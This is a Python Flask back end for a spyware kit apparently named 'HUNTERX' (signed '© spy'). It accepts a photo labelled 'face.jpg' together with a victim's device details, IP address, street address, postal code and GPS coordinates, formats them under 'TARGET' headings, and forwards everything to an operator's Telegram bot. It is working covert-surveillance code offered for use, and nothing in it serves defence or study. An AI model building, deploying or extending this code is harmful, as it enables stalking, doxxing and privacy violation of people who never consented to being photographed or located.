from flask import Flask, render_template, request
import requests, json

app = Flask(__name__)

# Ambil token dan chat_id dari config.txt
with open("config.txt", "r") as f:
    lines = f.readlines()
    BOT_TOKEN = lines[0].strip().split('=', 1)[1]
    CHAT_ID = lines[1].strip().split('=', 1)[1]

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    photo = request.files.get('photo')
    info_raw = request.form.get('info')

    if not photo or not info_raw:
        return "Missing data", 400

    try:
        info = json.loads(info_raw)
    except Exception as e:
        return f"Invalid JSON: {str(e)}", 400

    # Fungsi bantu untuk skip nilai kosong / "-"
    def baris(label, value):
        return f"┃ ⌬ *{label} :* `{value}`\n" if value and value not in ["-", "Unknown"] else ""

    caption = "┏◪ *『 乂 INFORMASI BOT 乂 』━⊱*\n"
    caption += "┃ ⌬ *NAME :* `HUNTERX`\n"
    caption += "┃ ⌬ *VERSION :* `1.4`\n"
    caption += "┃ ⌬ *DEVELOPER :* `AZM O.C.S`\n"
    caption += "┗◪\n\n"

    caption += "┏◪ *『 乂 DEVICE TARGET 乂 』━⊱*\n"
    caption += baris("MEREK", info.get("merek", "-"))
    caption += baris("RAM", info.get("ram", "-"))
    caption += baris("ROM", info.get("rom", "-"))
    caption += baris("MODEL", info.get("model", "-"))
    caption += baris("BATRAI", info.get("batrai", "-"))
    caption += baris("PING", info.get("ping", "-"))
    caption += baris("LAYAR", info.get("layar", "-"))
    caption += baris("CPU", info.get("cpu", "-"))
    caption += baris("VERSI", info.get("versi", "-"))
    caption += "┗◪\n\n"

    caption += "┏◪ *『 乂 LOKASI TARGET 乂 』━⊱*\n"
    caption += baris("IP", info.get("ip", "-"))
    caption += baris("NEGARA", info.get("negara", "-"))
    caption += baris("PROVINSI", info.get("provinsi", "-"))
    caption += baris("KOTA", info.get("kota", "-"))
    caption += baris("KECAMATAN", info.get("kecamatan", "-"))
    caption += baris("KODE POS", info.get("kodepos", "-"))
    caption += baris("ALAMAT", info.get("alamat", "-"))
    caption += baris("KORDINAT", info.get("koordinat", "-"))
    caption += baris("WAKTU", info.get("waktu", "-"))
    caption += "┗◪\n\n"
    caption += "> _© spy_"

    files = { "photo": ("face.jpg", photo.read(), "image/jpeg") }
    data = { "chat_id": CHAT_ID, "caption": caption, "parse_mode": "Markdown" }

    resp = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data, files=files)

    if resp.status_code != 200:
        return f"Telegram API error: {resp.text}", 500

    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7979)
